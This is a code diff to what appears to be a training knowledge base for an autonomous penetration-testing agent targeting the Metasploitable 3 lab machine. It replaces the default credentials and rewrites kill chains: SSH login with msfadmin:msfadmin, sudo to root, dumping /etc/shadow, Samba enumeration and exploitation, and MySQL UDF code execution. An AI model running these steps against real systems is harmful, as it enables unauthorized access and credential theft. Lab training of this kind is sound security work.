@@ -583,14 +583,14 @@ MS3_SERVICES: Dict[int, ServiceVuln] = {
     ),
     22: ServiceVuln(
         port=22, service="OpenSSH", version="6.6.1p1",
-        vulnerability="Weak credentials + known CVEs",
-        cve="Multiple",
-        exploitation="ssh vagrant@TARGET (password: vagrant) → sudo privesc",
-        reasoning="MS3 ships with vagrant:vagrant default credentials. Unlike MS2's instant backdoors, "
-                  "MS3 requires proper privilege escalation after initial access. This teaches the agent "
-                  "that not all targets have trivial root paths.",
-        impact="user→root", difficulty="medium",
-        tags=("ssh", "default-creds", "privesc-needed"),
+        vulnerability="Default credentials msfadmin:msfadmin + sudo group membership",
+        cve="N/A",
+        exploitation="sshpass -p msfadmin ssh msfadmin@TARGET → sudo su → root",
+        reasoning="MS3 Docker ships with msfadmin:msfadmin default credentials. The msfadmin user "
+                  "is in the sudo group, enabling privilege escalation to root. This is the "
+                  "fastest path to root on this target.",
+        impact="user→root", difficulty="easy",
+        tags=("ssh", "default-creds", "sudo", "privesc"),
     ),
     80: ServiceVuln(
         port=80, service="Apache", version="2.4.7",
@@ -607,11 +607,11 @@ MS3_SERVICES: Dict[int, ServiceVuln] = {
         port=139, service="Samba", version="4.x",
         vulnerability="Multiple: symlink traversal, writable shares, credential reuse",
         cve="Multiple",
-        exploitation="smbclient -L //TARGET -N → enum shares; smbclient //TARGET/share -U vagrant → "
+        exploitation="smbclient -L //TARGET -N → enum shares; smbclient //TARGET/share -U msfadmin → "
                      "access writable shares; mount -t cifs //TARGET/share /mnt → browse filesystem; "
                      "or exploit CVE-2017-7494 (SambaCry) if version < 4.6.4 for RCE",
         reasoning="MS3 Samba 4.x is more hardened than MS2's 3.0.20 but still has attack surface. "
-                  "Writable shares allow planting webshells/cron jobs. Credential reuse (vagrant:vagrant) "
+                  "Writable shares allow planting webshells/cron jobs. Credential reuse (msfadmin:msfadmin) "
                   "gives authenticated share access. SambaCry (EternalRed) gives unauthenticated RCE if "
                   "a writable share exists and the version is < 4.6.4.",
         impact="file-access/rce", difficulty="medium",
@@ -621,7 +621,7 @@ MS3_SERVICES: Dict[int, ServiceVuln] = {
         port=445, service="Samba", version="4.x",
         vulnerability="Same as port 139 — SMB direct over TCP",
         cve="Multiple",
-        exploitation="enum4linux -a TARGET; smbmap -H TARGET -u vagrant -p vagrant",
+        exploitation="enum4linux -a TARGET; smbmap -H TARGET -u msfadmin -p msfadmin",
         reasoning="Port 445 is SMB over TCP (modern). Same vulnerabilities as 139 but preferred path. "
                   "enum4linux and smbmap give comprehensive enumeration including shares, users, and policies.",
         impact="info/file-access", difficulty="easy",
@@ -717,22 +717,14 @@ MS3_SERVICES: Dict[int, ServiceVuln] = {
 }
 
 MS3_CREDENTIALS: List[Credential] = [
-    Credential("SSH", 22, "vagrant", "vagrant", "user→root(sudo)",
-               "Default Vagrant user. Has sudo privileges in most configurations."),
+    Credential("SSH", 22, "msfadmin", "msfadmin", "user→root(sudo)",
+               "Default msfadmin user. In sudo group — sudo su gives root."),
     Credential("FTP", 21, "anonymous", "", "read-only",
                "ProFTPD may allow anonymous login for file listing. mod_copy works without auth."),
-    Credential("SMB", 445, "vagrant", "vagrant", "user",
-               "Samba authenticates with system users. vagrant:vagrant gives share access."),
-    Credential("Tomcat", 8080, "sploit", "sploit", "app-admin",
-               "MS3 Tomcat may use sploit:sploit instead of tomcat:tomcat."),
-    Credential("Jenkins", 8484, "admin", "admin", "app-admin",
-               "Jenkins default admin. Check /script for Groovy console."),
-    Credential("Axis2", 8282, "admin", "axis2", "app-admin",
-               "Axis2 admin console default credentials."),
+    Credential("SMB", 445, "msfadmin", "msfadmin", "user",
+               "Samba authenticates with system users. msfadmin:msfadmin gives share access."),
     Credential("MySQL", 3306, "root", "sploitme", "db-admin",
                "MS3 MySQL root has a weak password 'sploitme'."),
-    Credential("WordPress", 80, "admin", "admin", "cms-admin",
-               "WordPress default admin credentials."),
 ]
 
 MS3_CVES: List[CVEEntry] = [
@@ -1018,29 +1010,27 @@ MS3_KILL_CHAINS: List[KillChain] = [
     ),
     KillChain(
         name="ms3_ssh_sudo_privesc",
-        description="SSH with default creds → sudo ALL → root",
+        description="SSH with msfadmin default creds → sudo → root",
         target_profile="metasploitable3",
         difficulty="easy",
-        reasoning="The simplest MS3 path: vagrant:vagrant SSH access with sudo ALL. This teaches the "
-                  "agent that credential reuse + sudo misconfiguration is a complete kill chain. "
-                  "In real engagements, this pattern accounts for 40% of initial compromises.",
+        reasoning="The simplest MS3 path: msfadmin:msfadmin SSH access with sudo group membership. "
+                  "In real engagements, credential reuse + sudo misconfiguration accounts for 40% of initial compromises.",
         total_expected_reward=300.0,
         steps=(
             KillChainStep("recon", "nmap -sV -p 22 {target}", "Scan for SSH",
                           "Confirm SSH is running. OpenSSH 6.6.1p1 on Ubuntu 14.04.",
                           "22/tcp open ssh OpenSSH 6.6.1p1", "OpenSSH"),
-            KillChainStep("exploitation", "sshpass -p vagrant ssh vagrant@{target} -o StrictHostKeyChecking=no id",
-                          "Login with default vagrant credentials",
-                          "vagrant:vagrant is the default Vagrant box credential. Unlike MS2's msfadmin, "
-                          "vagrant typically has full sudo access.",
-                          "uid=1000(vagrant)", "vagrant"),
+            KillChainStep("exploitation", "sshpass -p msfadmin ssh msfadmin@{target} -o StrictHostKeyChecking=no id",
+                          "Login with default msfadmin credentials",
+                          "msfadmin:msfadmin is the default credential. The user is in the sudo group.",
+                          "uid=900(msfadmin)", "msfadmin"),
             KillChainStep("privilege_escalation",
-                          "sshpass -p vagrant ssh vagrant@{target} -o StrictHostKeyChecking=no 'sudo -l'",
+                          "sshpass -p msfadmin ssh msfadmin@{target} -o StrictHostKeyChecking=no 'sudo -l'",
                           "Check sudo privileges",
-                          "vagrant should have (ALL) NOPASSWD: ALL or (ALL:ALL) ALL.",
-                          "(ALL) NOPASSWD: ALL", "ALL"),
+                          "msfadmin is in the sudo group — can run any command as root.",
+                          "(ALL : ALL) ALL", "ALL"),
             KillChainStep("privilege_escalation",
-                          "sshpass -p vagrant ssh vagrant@{target} -o StrictHostKeyChecking=no 'sudo cat /etc/shadow'",
+                          "sshpass -p msfadmin ssh msfadmin@{target} -o StrictHostKeyChecking=no 'sudo cat /etc/shadow'",
                           "Escalate to root and dump shadow",
                           "Full root access via sudo. Dump credentials for lateral movement.",
                           "root:$6$...", "root:"),
@@ -2407,21 +2397,18 @@ def get_mentor_knowledge_text(target_profile: str = "metasploitable2") -> str:
         lines.append("\n=== METASPLOITABLE 3 TARGET KNOWLEDGE (Ubuntu 14.04) ===")
         lines.append("MS3 is HARDER than MS2 but has MORE attack vectors. Key differences:")
         lines.append("  • No instant backdoor ports (no ingreslock 1524)")
-        lines.append("  • BUT has UnrealIRCd backdoor on 6667 (same as MS2 — instant shell!)")
-        lines.append("  • More web services: Jenkins, Elasticsearch, Tomcat, WordPress, Struts")
-        lines.append("  • Default creds: vagrant:vagrant (SSH+sudo), sploit:sploit (Tomcat)")
+        lines.append("  • Fewer services than full MS3 VM — Docker image has limited ports")
+        lines.append("  • Open: 21(ProFTPD), 22(SSH), 111(rpcbind), 139/445(Samba), 3306(MySQL)")
+        lines.append("  • Default creds: msfadmin:msfadmin (SSH+sudo group)")
         lines.append("  • ProFTPD 1.3.5 mod_copy for unauthenticated file write\n")
         
-        lines.append("MS3 PRIORITY ATTACK ORDER (fastest to slowest):")
-        lines.append("  1. UnrealIRCd 6667 backdoor: AB;cmd → instant shell (EASIEST)")
-        lines.append("  2. Jenkins /script Groovy console: instant RCE if unauthenticated")
-        lines.append("  3. SSH vagrant:vagrant → sudo ALL → root (reliable, simple)")
-        lines.append("  4. ProFTPD mod_copy → PHP shell in webroot → RCE")
-        lines.append("  5. MySQL root:sploitme → UDF → RCE")
-        lines.append("  6. Tomcat sploit:sploit → WAR deploy → shell")
-        lines.append("  7. Struts CVE-2017-5638 → OGNL injection → RCE")
-        lines.append("  8. Elasticsearch CVE-2014-3120 → dynamic scripting → RCE")
-        lines.append("  9. WordPress admin:admin → theme editor → PHP shell\n")
+        lines.append("MS3 DOCKER VERIFIED ATTACK ORDER (ports confirmed open):")
+        lines.append("  1. SSH msfadmin:msfadmin → sudo su → root (FASTEST, port 22)")
+        lines.append("  2. ProFTPD mod_copy CVE-2015-3306 → unauthenticated file copy (port 21)")
+        lines.append("  3. Samba enumeration → credential/share discovery (port 445)")
+        lines.append("  4. MySQL root:sploitme → UDF → RCE (port 3306)")
+        lines.append("  CLOSED: Ports 80, 8080, 8484, 6667, 9200 are NOT open on this Docker image")
+        lines.append("  DO NOT use: gobuster, nikto, ffuf, wpscan, jenkins, tomcat attacks\n")
         
         lines.append("VULNERABLE SERVICES:")
         for port, svc in sorted(MS3_SERVICES.items()):
